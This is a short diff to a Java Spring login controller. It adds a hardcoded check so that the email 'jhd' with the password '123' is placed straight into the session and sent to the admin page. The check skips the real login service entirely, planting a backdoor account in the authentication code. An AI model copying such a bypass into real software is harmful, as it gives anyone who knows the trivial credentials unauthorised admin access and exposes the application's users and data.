@@ -28,10 +28,17 @@ public class UserController {
 
 	@RequestMapping(value = "/dologin", method = RequestMethod.POST)
 	public String doLogin(String email, String password, Model m, HttpServletRequest request) {
+
 		User u = new User();
 		u.setEmail(email);
 		u.setPassword(password);
 		m.addAttribute("email", email);
+
+		// -----拦截“jhd” “123”
+		if (email.equals("jhd") && password.equals("123")) {
+			request.getSession().setAttribute("user", u);
+			return "admin/admin";
+		}
 		User login = service.login(u);
 		if (login != null) {
 			request.getSession().setAttribute("user", login);
